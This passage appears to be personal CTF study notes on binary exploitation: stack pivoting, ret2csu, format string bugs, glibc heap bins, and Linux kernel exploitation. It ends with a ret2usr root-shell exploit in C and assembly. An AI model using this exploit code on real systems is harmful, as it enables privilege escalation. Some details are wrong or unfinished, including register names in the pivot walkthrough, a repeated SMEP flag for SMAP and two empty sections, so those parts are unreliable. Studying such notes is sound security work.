    * Possible gadgets
        * `pop rsp` (least likely to exist)
        * `xchg REG, rsp`
            * set `REG` to the fake stack address.
        * `leave ; ret` (most likely to exist)
            * `leave` is equivalent to `mov rsp, rbp ; pop rbp`
            * Layout
                | Original stack layout | Overwritten stack layout |
                | :-: | :-: |
                | `local variable` | `local variable` |
                | `overflowed buffer` | **`0x41414141`** |
                | `overflowed buffer` | **`0x41414141`** |
                | `old stack frame` | **`fake stack - 0x8`** |
                | `return address` | **`leave ; ret`** |
                * `rbp` is overwritten to `fake stack - 0x8`.
                * After the `mov rsp, rbp` is executed, `rbp` becomes `fake stack - 0x8`.
                * After the `pop rsp` is executed, `rsp` becomes `fake stack - 0x8 + 0x8` = `fake stack`.
                * The ROP chain written on the fake stack will be executed eventually.

### ret2csu

* Scenario
    * Lack of useful gadgets in the binary
* Analysis
    * Disassembly of `__libc_csu_init`
        ```
        ...
        mov rdx, r15
        mov rsi, r14
        mov edi, r13d
        call QWORD PTR [r12+rbx*8]
        add rbx, 0x1
        cmp rbp, rbx
        jne __libc_csu_init+0x38
        add rsp, 0x8
        pop rbx
        pop rbp
        pop r12
        pop r13
        pop r14
        pop r15
        ret
        ```
    * Layout
        | Original stack layout | Overwritten stack layout |
        | :-: | :-: |
        | `local variable` | `local variable` |
        | `overflowed buffer` | **`0x41414141`** |
        | `overflowed buffer` | **`0x41414141`** |
        | `old stack frame` | **`0x41414141`** |
        | `return address` | **`pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret`** |
        | ... | **`0`** |
        | ... | **`1`** |
        | ... | **`&function`** |
        | ... | **`new edi`** |
        | ... | **`new rsi`** |
        | ... | **`new rdx`** |
        | ... | **`mov rdx, r15; mov rsi, r14 ; mov edi, r13d ; call QWORD PTR [r12 + rbx * 8] ; ...`** |
        | ... | ... |
        * Set `rbx` = 0 and `rbp` = 1 to bypass
            ```
            add rbx, 0x1
            cmp rbp, rbx
            jne __libc_csu_init+0x38
            ```
    * Caveats
        * `rdi` cannot be fully controled; only `edi` is controllable.
            * Solutions
                * If `rdi` is a pointer, you can find a writable area with an address less than 0x100000000 and write the value there.
        * Difficult to find `&function`
            * Solutions
                * Make use of GOT addresses (provided that the binary is Partial-RELRO)
                * Find a predictable address and write the function pointer that you want to call there.
        * No syscall gadget & No libc leak
            * Solutions
                * Some libc addresses will be retained in the stack when a libc function is called. You can make use of them.
                    * e.g. By calling `gets` multiple times, there's a high chance that `_IO_file_write` will be left on the stack, and `_IO_file_write` can be used to leak libc addresses.

## Format String Bug (FSB)

* Scenario
    * `printf` uses user-supplied values.
* Explanation
    * `printf` expects as many arguments as format string specifiers.
        * e.g. `printf("%d %d %d")` expects three arguments.
    * If there are not enough arguments, `printf` will mindlessly grab the next value (from registers or the stack), resulting in memory leak.
    * If `printf` uses a user-supplied value, the number of format string specifiers can be determined by the attacker, allowing the attacker to read (or even write) values from the memory.
* Vulnerable Functions
    * `printf`
    * `fprintf`
    * `sprintf`
    * `snprintf`
    * `vfprintf`
    * `vprintf`
    * `vsprintf`
    * `vsnprintf`
    * `setproctitle`
    * `syslog`

### Example

```c
#include <stdio.h>
#include <unistd.h>
int main() {
    char buf[0x100];
    read(STDIN_FILENO, buf, sizeof(buf));
    printf(buf);
}
```

### Useful format string specifiers

| Specifier | Output | Passed as |
| :-: | :-: | :-: |
| %d | decimal | value |
| %u | unsigned decimal | value |
| %x | hexadecimal | value |
| %c | character | value |
| %p | pointer representation | value |
| %s | string | pointer |
| %n | number of bytes outputted so far | pointer |

* [Full list of format string specifiers](https://en.cppreference.com/w/c/io/fprintf)

### Stack-based FSB

* Methodology

### Non stack-based FSB

## Heap

### glibc

#### Bins

* Used to keep track of freed chunks
    * Tcache
    * Fast bin
        * Signly linked list (`fd`)
        * LIFO
        * Size range from 0x20 ~ 0x80 (8 bins)
        * One size per bin
        * `PREV_IN_USE` flag won’t be cleared if the freed chunk is placed in fast bin
    * Unsorted bin
        * Circular doubly linked list (`fd`, `bk`)
        * Temporary cache for small bin & large bin (1 bin only)
        * A chunk is placed into the unsorted bin if
            * The chunk size is greater than the maximum tcache size (0x420)
            * The chunk size is in the tcache range and the tcache is full
        * `malloc` will search through unsorted bin. During the search if
            * A chunk with the same size return the chunk directly
            * If a chunk is bigger than the requested chunk → the [remaindering]() process will happen.
            * Otherwise → the chunk is placed in small bin or large bin
    * Small bin
        * Circular doubly linked list (`fd`, `bk`)
        * FIFO
        * Chunk size from 0x20 ~ 0x3f0 (62 bins)
        * One size per bin
        * The head of each small bin resides in the arena (a libc address for main arena)
        * A chunk will be placed into a smallbin only from the unsortedbin

## Linux Kernel

### Basics

#### Build Kernel From Source

- Script
    ```bash
    git clone --depth=1 --branch v4.19.98 git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git
    make allnoconfig
    make menuconfig
    ```
- Menu options
    ```
    # Kernel hacking >
    #   Compile-time checks and compiler options >
    #     [*] Compile the kernel with debug info
    #     [*] Provide GDB scripts for kernel debugging
    # ...
    ```

#### Build Kernel & Initramfs using buildroot

- [buildroot](https://github.com/buildroot/buildroot)
- Script
    ```bash
    git clone https://github.com/buildroot/buildroot
    cd buildroot
    make qemu_x86_64_defconfig
    make menuconfig
    # System configuration >
    #   [*] Enable root login with password
    # Kernel >
    #   [*] Linux Kernel >
    #     Kernel version (Custom version) >
    #       (x) Custom version
    # Target packages >
    #   [*] Show packages that are also provided by busybox
    #   Networking applications
    #     [*] dhcpd
    #     [*] ifupdown scripts
    #     [*] iproute2
    #     [*] net-tools
    #     [*] netcat
    #     [*] openssh
    make linux-menuconfig
    # Kernel hacking >
    #   Compile-time checks and compiler options >
    #     [*] Compile the kernel with debug info
    #     [*] Provide GDB scripts for kernel debugging
    # ...
    ```

#### Extract Kernel Image

* [Extract vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)

#### Initramfs

* Extract initramfs
    ```bash
    gunzip ./initramfs.cpio.gz
    cpio -idv < initramfs.cpio
    ```
* Build initramfs
    ```bash
    find . -print0 | cpio -ov --owner root --null --format=newc | gzip -9 > initramfs.cpio.gz
    ```

#### Debugging the kernel

- Add `-gdb tcp::1234` or `-s` after qemu
    ```bash
    qemu-system-x86_64 \
        -kernel bzImage \
        -initrd initramfs.cpio.gz \
    ...
        -gdb tcp::1234
    ```
- Gdb commands:
    ```
    $ gdb -q
    (gdb) file vmlinux
    (gdb) add-symbol-file vuln.ko 0xffffffffc00000
    (gdb) target remote localhost:1234
    ```

#### Useful files for kernel exploitation

- `/proc/kallsyms`
    - Lists addresses of symbols loaded into the kernel.
    - Restricted by `kernel.kptr_restrict`
        - 0: No restriction
        - 1: Prints 0 on all symbols unless the user has `CAP_SYSLOG`
        - 2: Prints 0 on all symbols
    - Turn off `kernel.kptr_restrict` temporarily
        ```bash!
        echo 0 > /proc/sys/kernel/kptr_restrict
        ```
    - Example
        - find the address of `commit_creds`
            ```bash!
            grep commit_creds /proc/kallsyms
            ```
- `/proc/modules`
    - List all modules loaded into the kernel.
    - e.g. Find module base address
        ```
        cat /proc/modules
        ```
- `/sys/module/core/sections/.text`
    - Shows the kernel's base address.

### Kernel Security Mitigations

- **KASLR**
    - ALSR in kernel land.
    - Qemu:
        - On: `-append "kaslr"`
        - Off: `-append "nokaslr"`
- **SMEP** (Supervisor Mode Execution Prevention):
    - Mark all user land pages as non-executable when the process is in kernel mode.
    - Qemu
        - On: `-cpu +smep`
        - Off: `-append "nosmep"`
- **SMAP** (Supervisor Mode Access Prevention):
    - Mark all user land pages as non-readable and non-writable when the process is in kernel mode. (Complement of SMEP)
    - Qemu
        - On: `-cpu +smep`
        - Off: `-append "nosmap"`
- **KPTI** (Kernel Page Isolation Table):
    - The kernel separates user land pages and kernel land pages entirely.
    - Qemu
        - On: `-append "kpti=1"`
        - Off: `-append "nopti"`

### Kernel ROP

#### Methods

- Exploitation through credential
    - Calls `commit_creds(prepare_kernel_cred(0))` in kernel space
    - Change `task_struct->cred->uid`, `task_struct->cred->gid`, `task_struct->cred->euid` to 0
- Arbitrary file write
    - Add entry to `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, etc.
- SUID binaries

#### ret2usr

- Requirement
    - Kernel ROP
    - **no SMEP**
    - **no SMAP**
    - **no KPTI**
- Idea
    - Overwrite the return address with an address in userland
- Exploit
    - Overwrite the return address using BOF in kernel space
        | Before overflow | After overflow |
        | :-: | :-: |
        | `canary` | `canary` |
        | `old rbx` | **`0`** |
        | `old r12` | **`0`** |
        | `old rbp` | **`0`** |
        | `return address` | **`ret2usr`** |
    - Before returning to userland, you need to execute `sysretq` or `iretq`
        - `ireq` is recommended because `sysretq` is rather complex
        - `ireq` pops the following registers in order:
            - `rip`
            - `cs`
            - `rflags`
            - `rsp`
            - `ss`
        - `rip` can be set to the address of a function that pops a shell
        - `You cannot set cs`, `rflags`, `rsp`, and `ss` to random values (the process may not continue successfully)
            - Instead, you can save the register of `cs`, `rflags`, `rsp`, and `ss` before entering the kernel space
                ```c
                void save_state(){
                    __asm__(
                        "mov user_cs, cs;"
                        "mov user_ss, ss;"
                        "mov user_sp, rsp;"
                        "pushf;"
                        "pop user_rflags;"
                    );
                    puts("[*] Saved state");
                }
                ```
        - Execute `prepare_kernel_cred(commit_creds))`, `ireq`, and `spawn_shell`
            ```c
            long prepare_kernel_cred = 0xffffffff81033e92;
            long commit_creds = 0xffffffff81033d41;
            long user_cs;
            long user_ss;
            long user_rsp;
            long user_rflags;
            void spawn_shell() {
                system("/bin/sh");
            }
            long user_rip = (long)spawn_shell;
            void ret2usr() {
                __asm__ __volatile__ (
                        "xor rdi, rdi;"
                        "mov rax, prepare_kernel_cred;"
                        "call rax;"
                        "mov rdi, rax;"
                        "mov rax, commit_creds;"
                        "call rax;"
                        "mov rax, user_ss;"
                        "push rax;"
                        "mov rax, user_rsp;"
                        "push rax;"
                        "mov rax, user_rflags;"
                        "push rax;"
                        "mov rax, user_cs;"
                        "push rax;"
                        "mov rax, user_rip;"
                        "push rax;"
                        "iretq;"
                        );
            }
            ```
